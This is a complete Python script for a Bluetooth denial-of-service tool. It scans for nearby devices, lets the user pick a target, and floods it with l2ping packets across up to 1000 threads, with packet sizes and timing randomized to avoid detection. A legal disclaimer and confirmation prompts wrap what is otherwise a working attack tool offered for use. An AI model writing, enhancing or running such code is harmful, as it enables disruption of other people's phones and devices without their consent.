#!/usr/bin/env python3
import os
import sys
import time
import signal
import threading
import subprocess
from datetime import datetime
import platform
import random
import string
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

# Constants
VERSION = "3.0"
AUTHOR = "xanonDev (Enhanced by AI)"
GITHUB = "https://github.com/xanonDev/Bluetooth-DDoS-Tool"
MAX_THREADS = 1000
DEFAULT_PACKET_SIZE = 600
MIN_PACKET_SIZE = 100
MAX_PACKET_SIZE = 2000

class BluetoothDDoSTool:
    def __init__(self):
        self.running = False
        self.threads = []
        self.attack_stats = {
            'start_time': None,
            'packets_sent': 0,
            'devices_found': 0,
            'attack_duration': None
        }
        signal.signal(signal.SIGINT, self.signal_handler)

    def clear_screen(self):
        """Clear terminal screen cross-platform"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def signal_handler(self, sig, frame):
        """Handle CTRL+C interrupt"""
        self.stop_attack()
        print(Fore.RED + "\n[!] Attack stopped by user")
        sys.exit(0)

    def print_banner(self):
        """Print the tool banner with enhanced ASCII art"""
        self.clear_screen()
        print(Fore.MAGENTA + Style.BRIGHT + r"""
  ____  _      _   _           ____  ____  ____     _______       _   
 | __ )| |    | | | |         |  _ \|  _ \/ ___|   | ____\ \ / / \  
 |  _ \| |    | |_| |  _____  | | | | | | \___ \   |  _|  \ V /|   \ 
 | |_) | |___ |  _  | |_____| | |_| | |_| |___) |  | |___  | | | ⌂ | 
 |____/|_____||_| |_|         |____/|____/|____/   |_____| |_| |_| |_|
        """)
        print(Fore.CYAN + f"Version: {VERSION} | {AUTHOR}")
        print(Fore.BLUE + f"GitHub: {GITHUB}")
        print(Fore.YELLOW + "="*60 + Style.RESET_ALL)

    def print_disclaimer(self):
        """Print enhanced legal disclaimer"""
        print(Fore.RED + Style.BRIGHT + "\n[!] LEGAL DISCLAIMER:")
        print(Fore.YELLOW + """
THIS TOOL IS PROVIDED STRICTLY FOR EDUCATIONAL PURPOSES AND SECURITY RESEARCH. 
UNAUTHORIZED USE AGAINST NETWORKS OR DEVICES WITHOUT EXPLICIT PERMISSION IS ILLEGAL 
AND MAY RESULT IN CRIMINAL CHARGES.

BY USING THIS SOFTWARE, YOU AGREE THAT:
1. You will only use this tool on devices you own or have permission to test
2. You accept full responsibility for any consequences of misuse
3. The developers bear no liability for unlawful or malicious use
        """)
        
        consent = input(Fore.GREEN + "\n[?] Do you understand and accept these terms? (y/N): ").lower()
        if consent != 'y':
            print(Fore.RED + "[!] Aborting...")
            sys.exit(0)

    def check_platform(self):
        """Verify we're running on Linux"""
        if platform.system() != 'Linux':
            print(Fore.RED + "[!] This tool requires Linux (preferably Kali)")
            sys.exit(1)

    def check_dependencies(self):
        """Verify required tools are installed with better checking"""
        required = {
            'l2ping': 'bluez',
            'hcitool': 'bluez',
            'hciconfig': 'bluez',
            'rfkill': 'util-linux'
        }
        missing = []
        
        for tool, package in required.items():
            try:
                subprocess.check_output(['which', tool], stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                missing.append((tool, package))
        
        if missing:
            print(Fore.RED + "[!] Missing dependencies:")
            for tool, package in missing:
                print(Fore.YELLOW + f"  - {tool} (install with: sudo apt install {package})")
            sys.exit(1)

    def enable_bluetooth(self):
        """Ensure Bluetooth is enabled and up with better error handling"""
        try:
            # Check if Bluetooth is blocked
            rfkill_output = subprocess.check_output(['rfkill', 'list'], text=True)
            if 'bluetooth' in rfkill_output.lower() and 'yes' in rfkill_output.lower():
                print(Fore.YELLOW + "[*] Unblocking Bluetooth...")
                subprocess.run(['sudo', 'rfkill', 'unblock', 'bluetooth'], check=True)
            
            # Bring up interface
            print(Fore.YELLOW + "[*] Enabling hci0 interface...")
            subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], check=True)
            
            # Verify interface is up
            hci_status = subprocess.check_output(['hciconfig', 'hci0'], text=True)
            if 'UP' not in hci_status:
                raise Exception("Failed to bring up hci0 interface")
                
            print(Fore.GREEN + "[+] Bluetooth interface ready")
            
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"[!] Bluetooth setup failed: {str(e)}")
            sys.exit(1)

    def scan_devices(self, duration=15):
        """Enhanced device scanning with timeout and better parsing"""
        print(Fore.CYAN + f"\n[+] Scanning for Bluetooth devices (timeout: {duration}s)...")
        
        try:
            # Start scan in background
            scan_proc = subprocess.Popen(
                ['hcitool', 'scan'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for scan to complete or timeout
            try:
                output, _ = scan_proc.communicate(timeout=duration)
            except subprocess.TimeoutExpired:
                scan_proc.kill()
                output, _ = scan_proc.communicate()
                print(Fore.YELLOW + "[!] Scan timed out - partial results shown")
            
            lines = [line.strip() for line in output.splitlines() if line.strip()]
            if len(lines) <= 1:  # Only header or empty
                print(Fore.YELLOW + "[!] No devices found")
                return None
            
            devices = []
            print(Fore.GREEN + "\n[+] Discovered Devices:")
            print(Fore.YELLOW + "-"*80)
            print(Fore.YELLOW + "| ID  | MAC Address       | Device Name")
            print(Fore.YELLOW + "-"*80)
            
            for i, line in enumerate(lines[1:]):  # Skip header
                parts = line.split(maxsplit=1)
                if len(parts) >= 2:
                    mac, name = parts[0], parts[1]
                else:
                    mac, name = parts[0], "Unknown"
                
                devices.append((mac, name))
                print(Fore.WHITE + f"| {i:2}  | {mac:16} | {name}")
            
            print(Fore.YELLOW + "-"*80)
            self.attack_stats['devices_found'] = len(devices)
            return devices
            
        except Exception as e:
            print(Fore.RED + f"[!] Scan failed: {str(e)}")
            return None

    def ddos_attack(self, target_addr, packet_size, thread_id):
        """Enhanced DDoS attack function with randomization"""
        # Randomize packet sizes slightly to avoid simple detection
        size_variation = random.randint(-50, 50)
        actual_size = max(MIN_PACKET_SIZE, min(MAX_PACKET_SIZE, packet_size + size_variation))
        
        # Randomize timing slightly
        delay = random.uniform(0.01, 0.1)
        
        while self.running:
            try:
                # Add random payload to make packets less uniform
                random_payload = ''.join(random.choices(string.hexdigits, k=8))
                
                subprocess.run(
                    ['l2ping', '-i', 'hci0', '-s', str(actual_size), '-f', target_addr],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
                with threading.Lock():
                    self.attack_stats['packets_sent'] += 1
                
                time.sleep(delay)
            except:
                continue

    def monitor_attack(self):
        """Enhanced attack monitoring with more stats"""
        start = self.attack_stats['start_time']
        last_count = 0
        last_time = time.time()
        
        while self.running:
            current_time = time.time()
            elapsed = current_time - start.timestamp()
            packets = self.attack_stats['packets_sent']
            
            # Calculate packets per second
            time_diff = current_time - last_time
            pps = (packets - last_count) / time_diff if time_diff > 0 else 0
            
            self.clear_screen()
            self.print_banner()
            
            # Display attack stats
            print(Fore.GREEN + "\n[+] Attack Status:")
            print(Fore.YELLOW + "-"*60)
            print(Fore.CYAN + f"Elapsed Time: {self.format_duration(elapsed)}")
            print(Fore.CYAN + f"Packets Sent: {packets:,}")
            print(Fore.CYAN + f"Current Rate: {pps:,.2f} packets/sec")
            print(Fore.YELLOW + "-"*60)
            print(Fore.RED + "\nPress CTRL+C to stop the attack")
            
            # Update for next iteration
            last_count = packets
            last_time = current_time
            time.sleep(1)

    def format_duration(self, seconds):
        """Format duration as HH:MM:SS"""
        m, s = divmod(seconds, 60)
        h, m = divmod(m, 60)
        return f"{int(h):02d}:{int(m):02d}:{int(s):02d}"

    def start_attack(self, target_addr, packet_size, threads):
        """Start the DDoS attack with enhanced setup"""
        self.running = True
        self.attack_stats['start_time'] = datetime.now()
        self.attack_stats['packets_sent'] = 0
        
        print(Fore.YELLOW + f"\n[*] Starting attack with {threads} threads...")
        
        # Start attack threads
        for i in range(threads):
            t = threading.Thread(
                target=self.ddos_attack,
                args=(target_addr, packet_size, i),
                daemon=True
            )
            t.start()
            self.threads.append(t)
        
        # Start monitoring thread
        monitor = threading.Thread(target=self.monitor_attack, daemon=True)
        monitor.start()
        
        # Wait for threads (they run until stopped)
        for t in self.threads:
            t.join()
        
        monitor.join()

    def stop_attack(self):
        """Stop all attack threads and calculate stats"""
        self.running = False
        for t in self.threads:
            t.join(timeout=1)
        
        if self.attack_stats['start_time']:
            self.attack_stats['attack_duration'] = datetime.now() - self.attack_stats['start_time']
        
        self.threads = []

    def get_target(self, devices):
        """Enhanced target selection with validation"""
        while True:
            choice = input(Fore.GREEN + "\n[?] Enter target ID or MAC address: ").strip().upper()
            
            if not choice:
                continue
                
            # If input is a number (ID)
            if choice.isdigit():
                try:
                    index = int(choice)
                    if 0 <= index < len(devices):
                        return devices[index][0]  # Return MAC address
                    print(Fore.RED + f"[!] Invalid ID. Must be between 0-{len(devices)-1}")
                except ValueError:
                    print(Fore.RED + "[!] Invalid input")
            # If input is MAC address
            elif self.validate_mac(choice):
                return choice
            else:
                print(Fore.RED + "[!] Invalid MAC address format (use 00:11:22:33:44:55)")

    def validate_mac(self, mac):
        """Validate MAC address format"""
        parts = mac.split(':')
        return len(parts) == 6 and all(len(p) == 2 and all(c in string.hexdigits for c in p) for p in parts)

    def get_integer_input(self, prompt, default=None, min_val=None, max_val=None):
        """Enhanced integer input with validation"""
        while True:
            try:
                value = input(Fore.GREEN + prompt)
                if default and not value:
                    return default
                num = int(value)
                
                if min_val is not None and num < min_val:
                    print(Fore.RED + f"[!] Value must be ≥ {min_val}")
                    continue
                if max_val is not None and num > max_val:
                    print(Fore.RED + f"[!] Value must be ≤ {max_val}")
                    continue
                
                return num
            except ValueError:
                print(Fore.RED + "[!] Please enter a valid number")

    def run(self):
        """Main execution flow"""
        self.print_banner()
        self.print_disclaimer()
        self.check_platform()
        self.check_dependencies()
        self.enable_bluetooth()
        
        # Scan for devices
        devices = self.scan_devices()
        if not devices:
            return
        
        # Get target
        target = self.get_target(devices)
        
        # Get attack parameters
        packet_size = self.get_integer_input(
            "[?] Packet size (100-2000, default: 600): ",
            default=DEFAULT_PACKET_SIZE,
            min_val=MIN_PACKET_SIZE,
            max_val=MAX_PACKET_SIZE
        )
        
        threads = self.get_integer_input(
            f"[?] Number of threads (1-{MAX_THREADS}, default: 10): ",
            default=10,
            min_val=1,
            max_val=MAX_THREADS
        )
        
        # Final confirmation
        print(Fore.RED + Style.BRIGHT + f"\n[!] WARNING: About to attack {target}")
        print(Fore.RED + f"    Packet Size: {packet_size} | Threads: {threads}")
        confirm = input(Fore.YELLOW + "[?] Confirm attack? (y/N): ").lower()
        if confirm != 'y':
            print(Fore.YELLOW + "[!] Attack cancelled")
            return
        
        # Countdown
        print(Fore.RED + "\n[!] Starting attack in 5 seconds...")
        for i in range(5, 0, -1):
            print(Fore.YELLOW + f"[*] {i}...")
            time.sleep(1)
        
        try:
            self.start_attack(target, packet_size, threads)
        except Exception as e:
            print(Fore.RED + f"[!] Attack failed: {str(e)}")
        finally:
            self.stop_attack()
            self.show_summary()

    def show_summary(self):
        """Display attack summary"""
        duration = self.attack_stats.get('attack_duration')
        packets = self.attack_stats.get('packets_sent', 0)
        
        print(Fore.GREEN + "\n[+] Attack Summary:")
        print(Fore.YELLOW + "-"*60)
        if duration:
            print(Fore.CYAN + f"Duration: {self.format_duration(duration.total_seconds())}")
        print(Fore.CYAN + f"Total Packets Sent: {packets:,}")
        if duration and duration.total_seconds() > 0:
            rate = packets / duration.total_seconds()
            print(Fore.CYAN + f"Average Rate: {rate:,.2f} packets/sec")
        print(Fore.YELLOW + "-"*60)
        print(Fore.GREEN + "[+] Attack completed" + Style.RESET_ALL)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(Fore.RED + "[!] This tool requires root privileges. Run with sudo.")
        sys.exit(1)
    
    tool = BluetoothDDoSTool()
    tool.run()